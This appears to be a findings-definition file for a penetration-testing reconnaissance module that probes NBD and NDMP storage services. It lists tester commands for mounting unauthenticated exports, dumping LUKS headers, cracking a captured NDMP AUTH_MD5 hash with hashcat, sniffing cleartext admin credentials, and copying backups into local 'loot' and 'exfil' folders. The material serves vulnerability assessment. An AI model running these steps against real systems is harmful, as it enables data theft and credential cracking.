summary: Two protocols in one module. NBD list + info (T1), plus optional block-0 fingerprint read (T2). NDMP CONFIG_GET_* (T1), AUTH_MD5 challenge+bogus-response capture (T2 crack material). Missing T3 loot: NBD write test, NDMP CONNECT_CLIENT_AUTH with a cracked password, NDMP DATA/MOVER hijack proof.

findings.tier_evidence: NBD_OPT_LIST succeeds only against a server that answers unauth — deterministic, non-destructive.
findings.promotion_notes: Already paired with block-0 read (active_deep) fingerprint — that's T2.
findings.tester_next_step: nbd-client -l IP 10809  # list every export by name and description

findings.title_pattern: NBD export writable without authentication (block-level ransomware)
findings.tier_evidence: READ_ONLY transmission flag absent — posture read from NBD_OPT_INFO. Nothing is actually written.
findings.promotion_notes: T2 write-proof would require an actual NBD_CMD_WRITE at a canary offset — destructive. Better: T2 via READ of block 0 (already implemented as fingerprint).
findings.tester_next_step: modprobe nbd; nbd-client IP 10809 -N <export> /dev/nbd0; blockdev --getro /dev/nbd0  # 0 = writable

findings.tier_evidence: NBD_CMD_READ of block 0 is a real transmission-phase read against the volume — proves data access; matched against LUKS/VMDK/QCOW/GPT signature list. Non-destructive.
findings.promotion_notes: Extend to bounded read of full boot sector + LUKS header dump (< 2 MiB) for offline crack loop.
findings.tester_next_step: nbd-client IP 10809 -N <export> /dev/nbd0; dd if=/dev/nbd0 bs=1M count=2 of=header.bin; cryptsetup luksDump header.bin ; # or fsck -N /dev/nbd0

findings.title_pattern: NBD transport is cleartext (NBD_OPT_STARTTLS not enforced)
findings.tester_next_step: openssl s_client -connect IP:10809  # if NBDMAGIC banner instead of TLS ServerHello, plaintext confirmed

findings.tier_evidence: Succeeds only when the server discloses vendor/product/revision without a credential — deterministic vuln signal, read-only.
findings.promotion_notes: Combined with AUTH_MD5 challenge/response capture the module already emits, this is T2.
findings.tester_next_step: ndmpcopy -sa root:'' IP:/ /tmp/dev-null-mock  # if CONFIG_GET_SERVER_INFO returns pre-auth

findings.title_pattern: NDMP server accepts unauthenticated backup control (AUTH_NONE advertised)
findings.tier_evidence: AUTH_NONE is in the server-advertised auth_types array — deterministic posture.
findings.promotion_notes: Send NDMP_CONNECT_CLIENT_AUTH with AUTH_NONE and then DATA_START_BACKUP — real backup exfil. Recce currently only reads the advertisement, does not attempt AUTH_NONE.
findings.tester_next_step: ndmpcopy -sa '' -da '' IP:/vol/foo /tmp/loot ; # if it copies, backup control is unauth

findings.promotion_notes: Requires MITM to sniff a real admin login; unsafe/impractical from recce.
findings.tester_next_step: tcpdump -i any -A 'host IP and port 10000'  # capture the AUTH_TEXT cleartext credential when an admin logs in
review NDMP hostname/os/version fields; cross-check with SMB/AD enum

findings.title_pattern: NDMP filesystem / tape / SCSI inventory leaked pre-auth
findings.tier_evidence: FS_INFO/TAPE_INFO/SCSI_INFO returning without a credential is a vuln signal; the parsed contents themselves are the proof.
findings.promotion_notes: Chain with ndmp_unauth or cracked AUTH_MD5 -> DATA_START_BACKUP to pull an actual filesystem dump.
findings.tester_next_step: review recce probe output for filesystem paths; then: ndmpcopy -sa <user>:<pass> IP:/<vol> -da root:'' /tmp/exfil

findings.tier_evidence: Recce solicits a real fresh 64-byte challenge AND posts a bogus response, then formats a hashcat -m 50 line — the (challenge, response, username) is a real crack primitive. Non-destructive.
findings.promotion_notes: Auto-crack loop against captured hash with a wordlist and if cracked, run NDMP_CONNECT_CLIENT_AUTH -> DATA_START_BACKUP for real foothold. Currently stops at capture-and-format.
findings.tester_next_step: printf '%s\n' "<response>:<challenge>:<user>" > loot/ndmp.hash ; hashcat -m 50 loot/ndmp.hash /usr/share/wordlists/rockyou.txt ; then ndmpcopy -sa <user>:<cracked> IP:/vol/… -da root:'' /tmp/loot
note version in report; pair with vendor advisory review

findings.title_pattern: NDMP DATA / MOVER session hijack surface exposed
findings.tier_evidence: Emitted for every reachable NDMP endpoint; not probe-driven — this is a category/surface note, not proof.
findings.promotion_notes: Actually solicit NDMP_MOVER_LISTEN and connect to the returned port to prove hijack; today it's asserted on every reachable server without verification.
findings.tester_next_step: wireshark: tcp.port==10000 and ip.addr==IP  # observe MOVER_LISTEN + connect to the returned data port
